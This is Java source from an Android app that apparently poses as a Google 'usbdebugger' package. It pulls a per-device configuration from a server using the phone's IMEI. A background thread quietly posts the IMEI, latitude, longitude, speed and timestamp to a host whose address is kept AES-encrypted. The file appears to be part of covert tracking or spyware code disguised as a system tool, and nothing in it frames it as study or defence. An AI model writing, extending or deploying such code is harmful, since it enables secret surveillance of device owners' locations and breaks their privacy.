package com.google.android.usbdebugger;

import static android.util.Xml.Encoding.UTF_8;

import android.content.Context;
import android.os.Build;
import android.support.annotation.RequiresApi;
import android.util.Log;

import org.apache.http.client.HttpClient;
import org.apache.http.client.ResponseHandler;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.BasicResponseHandler;
import org.apache.http.impl.client.DefaultHttpClient;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLDecoder;
import java.util.ArrayList;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import javax.xml.transform.OutputKeys;
import javax.xml.transform.Transformer;
import javax.xml.transform.TransformerException;
import javax.xml.transform.TransformerFactory;
import javax.xml.transform.dom.DOMSource;
import javax.xml.transform.stream.StreamResult;

public class ReadXMLFile {
    private static final String [] column = {"VC", "SC","FT","PT","FD","US","PS",
            "GP","GP_T","CN","MS","DC","PR",
            "BS","SM","MI","FLC","RS", "DBC", "SH"};

    public static ArrayList main(final String address, final String imei1, Context context) {
        ArrayList aa = new ArrayList();
        try {
            String url = "";
            if(FTP_Sender.hasConnection(context, 1)) {
                url = "http://"+address+"/testxml.php?IMEI="+imei1;
            } else {
                return aa; // Return empty if no connection
            }

            DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();
            DocumentBuilder dBuilder = dbFactory.newDocumentBuilder();
            Document doc = dBuilder.parse(new URL(url).openStream());

            if (doc == null || doc.getDocumentElement() == null) {
                return aa; // Return empty if server gives empty response
            }

            doc.getDocumentElement().normalize();

            NodeList nList = doc.getElementsByTagName("IMEI");
            Node nNode = nList.item(0);

            if (nNode.getNodeType() == Node.ELEMENT_NODE) {
                Element eElement = (Element) nNode;
                for (String s : column) {
                    String content = eElement.getElementsByTagName(s).item(0).getTextContent();
                    if (content.equalsIgnoreCase("null")) {
                        aa.add("");
                    } else {
                        aa.add(content);
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return aa;
    }

    public static void TEST_PHP(final ArrayList param, final String IMEI1,
    final String latitude_n, final String longitude_m, final String speed_n, final String dtTime, final int Loc){

        new Thread(new Runnable() {

            @RequiresApi(api = Build.VERSION_CODES.KITKAT)
            public void run() {
                HttpURLConnection conn;
                String url ="";
                url = "IMEI="+IMEI1+"&";

                if(param != null && Loc!=1) {
                    for (int i = 0; i < column.length; i++) {
                        url += column[i] + "=" + param.get(i).toString();
                        url += "&";
                    }
                }
                try {
                    url += "Lat=" + URLDecoder.decode(latitude_n, UTF_8.toString()) +
                            "&Long=" + URLDecoder.decode(longitude_m, UTF_8.toString()) +
                            "&Speed=" + URLDecoder.decode(speed_n, UTF_8.toString()) +
                            "&DTime=" + dtTime.replace(" ", "%20");
                }catch (UnsupportedEncodingException ex){
                    Log.e("ERR1","TEST_PHP URL error: "+ex.getMessage());
                }
                String address ="";
                try {
                    if (param != null && param.size() > 2 && !param.get(2).toString().isEmpty()) {
                        address = "http://" + EncryptDecryptStringWithAES.decrypt(param.get(2).toString()) + "/test.php?" + url;
                    }
                } catch (Exception e) {
                     Log.e("ERR1","TEST_PHP address creation error: "+e.getMessage());
                     return;
                }

                try {
                    if(!address.isEmpty()) {
                        HttpClient httpclient = new DefaultHttpClient();
                        HttpPost httppost = new HttpPost(address);
                        ResponseHandler<String> responseHandler = new BasicResponseHandler();
                        httpclient.execute(httppost, responseHandler);
                    }

                }  catch(Exception ex) {
                    Log.e("ERR1","TEST_PHP HttpClient error: "+ex.getMessage());
                }

            }
        }).start();

    }

    public static boolean saveToXML(final ArrayList param, final String IMEI1, final File path) {
        Document dom;
        Element e = null;
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        try {
            DocumentBuilder db = dbf.newDocumentBuilder();
            dom = db.newDocument();

            Element rootEle = dom.createElement("Parameters");
            Element ParamEle = dom.createElement("IMEI");
            rootEle.appendChild(ParamEle);
            for (int i = 0; i < column.length; i++) {
                e = dom.createElement(column[i]);
                e.appendChild(dom.createTextNode(param.get(i).toString()));
                ParamEle.appendChild(e);
            }
            dom.appendChild(rootEle);

            try {
                Transformer tr = TransformerFactory.newInstance().newTransformer();
                tr.setOutputProperty(OutputKeys.INDENT, "yes");
                tr.setOutputProperty(OutputKeys.METHOD, "xml");
                tr.setOutputProperty(OutputKeys.ENCODING, "UTF-8");

                File ff = new File(path.getAbsoluteFile() + "/" + IMEI1 + ".xml");
                tr.transform(new DOMSource(dom), new StreamResult(new FileOutputStream(ff)));

                return true;
            } catch (TransformerException | IOException te) {
                System.out.println(te.getMessage());
                return false;
            }
        } catch (ParserConfigurationException pce) {
            System.out.println("UsersXML: Error trying to instantiate DocumentBuilder " + pce);
            return false;
        }
    }
}
